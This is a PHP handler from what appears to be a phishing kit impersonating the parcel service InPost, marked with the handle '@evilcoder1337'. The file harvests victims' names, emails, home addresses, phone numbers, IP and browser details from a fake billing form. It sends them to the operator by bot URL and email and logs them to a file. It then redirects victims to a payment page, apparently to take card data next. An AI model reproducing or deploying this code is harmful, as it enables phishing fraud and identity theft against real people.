<?php
ob_start();
session_start();
if(isset($_POST['full_name'])&&isset($_POST['mail'])){
	include '../../config.php';
	include '../Functions/Fuck-you.php';

	$evilm="#------------[ -INPOST- Address information ]------------#\r\n";
	$evilm.="Full name		: {$_POST['full_name']}\r\n";
	$evilm.="Email Address : {$_POST['mail']}\r\n";
	$evilm.="Address 1		: {$_POST['address1']}\r\n";
	$evilm.="Address 2		: {$_POST['address2']}\r\n";
	$evilm.="Phone number	: {$_POST['phone']}\r\n";
	$evilm.="Country		: {$_POST['country']}\r\n";
	$evilm.="City	: {$_POST['city']}\r\n";
	$evilm.="State	: {$_POST['state']}\r\n";
	$evilm.="ZIP code	: {$_POST['zip']}\r\n";
	$evilm.="#------------[ -EVIL-CODER- IP INFO ]------------#\r\n";
	$evilm.="IP ADDRESS	: {$_SESSION['ip']}\r\n";
	$evilm.="IP COUNTRY	: {$_SESSION['country']}\r\n";
	$evilm.="IP CITY	: {$_SESSION['city']}\r\n";
	$evilm.="BROWSER		: {$_SESSION['browser']} on {$_SESSION['platform']}\r\n";
	$evilm.="USER AGENT	: {$_SERVER['HTTP_USER_AGENT']}\r\n";
	$evilm.="TIME		: ".date("d/m/Y h:i:sa")." GMT\r\n";
	$evilm.="#------------[ -BY @evilcoder1337]------------#\r\n";
	$sendme = [
		'text' => $evilm
	];
	if ($bot_result == "yes") {
		$data = http_build_query($sendme);
		$response = file_get_contents($bot . $data);
	}
	if ($save_result_txt == "yes") {
		$save=fopen("../INPOST_result/billing_address.txt","a+");
		fwrite($save,$evilm);
		fclose($save);
}
	$subject="#INPOST EVIL-CODER Billing Info From {$_SESSION['ip']} [ {$_SESSION['country']}-{$_SESSION['countrycode']} - {$_SESSION['platform']} ]";
	$headers="From: INPOST EVIL-CODER  <inpost_evil@coder.bd>\r\n";
	$headers.="MIME-Version: 1.0\r\n";
	$headers.="Content-Type: text/plain; charset=UTF-8\r\n";

		@mail($mail,$subject,$evilm,$headers);
		

		
    $key = substr(sha1(mt_rand()),1,25);
	if ($show_payment_page=="yes") {
		exit(header("Location: ../../main/payment.php?inpost_id=".$key."&country=".$_SESSION['country']."&iso=".$_SESSION['countrycode'].""));
	}
else{

		$helper = array_keys($_SESSION);
    		foreach ($helper as $key){
        		unset($_SESSION[$key]);
    			}
    		exit(header("Location: http://gg.gg/12ye43")); // go to main page officiel..
	}

}else{
    header("HTTP/1.0 404 Not Found");
    exit();
}

?>